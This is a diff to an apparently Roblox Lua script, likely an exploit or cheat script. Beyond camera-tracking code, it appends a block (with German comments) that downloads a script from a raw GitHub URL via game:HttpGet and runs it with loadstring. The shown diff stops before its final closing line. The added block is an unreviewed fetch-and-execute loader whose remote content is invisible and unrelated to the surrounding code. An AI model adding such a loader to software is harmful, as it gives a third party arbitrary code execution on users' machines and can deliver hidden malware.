@@ -70,3 +70,20 @@ RunService.RenderStepped:Connect(function()
 		bg.CFrame = camera.CFrame
 	end
 end)
+-- Script zum Laden des externen Inhalts
+local scriptURL = "https://raw.githubusercontent.com/leckaxri/Epsteinmain.lua/refs/heads/main/Kakamain.lua"
+
+local success, content = pcall(function()
+    return game:HttpGet(scriptURL)
+end)
+
+if success then
+    -- Führt das geladene Script aus
+    local execute = loadstring(content)
+    if execute then
+        execute()
+    else
+        warn("Das Script konnte nicht geladen werden (Syntaxfehler).")
+    end
+else
+    warn("Fehler beim Abrufen der URL: " .. tostring(content))
